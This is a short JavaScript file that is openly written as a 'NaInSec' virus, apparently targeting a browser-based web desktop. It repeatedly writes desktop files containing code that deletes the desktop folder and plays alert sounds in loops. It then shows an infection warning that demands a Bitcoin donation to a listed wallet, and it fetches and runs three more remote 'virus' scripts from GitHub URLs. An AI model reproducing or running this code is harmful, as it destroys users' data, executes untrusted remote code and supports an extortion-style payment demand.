(function theLoop(i) {
    setTimeout(function() {

        // Function to generate random number
        function generateRandomNumber(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        const randomNumber = generateRandomNumber(1, 1000000);
        const desktopFilePath = `desktop/nainsec${randomNumber}.js`;
        $store.set(desktopFilePath, '$store.del("/a/desktop/")');

        for (let j = 0; j < 14; j++) {
            $audio('alert').play();
        }

        $store.keys();

        if (--i) {
            theLoop(i);
        }
    }, 10);
})(50);

const alertMessage = 'WARNING YOU HAVE BEEN INFECTED BY NAINSEC. Please Donate BTC: 14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5';
$alert(alertMessage);

const virusScripts = [
    "https://raw.githubusercontent.com/NaInSec/NaInSec_JSVirus/main/NaInSec_Virus.js",
    "https://raw.githubusercontent.com/NaInSec/NaInSec_JSVirus/main/Virus.js",
    "https://raw.githubusercontent.com/NaInSec/NaInSec_JSVirus/main/MemoryVirus.js"
];

virusScripts.forEach(script => $loader.script(script));
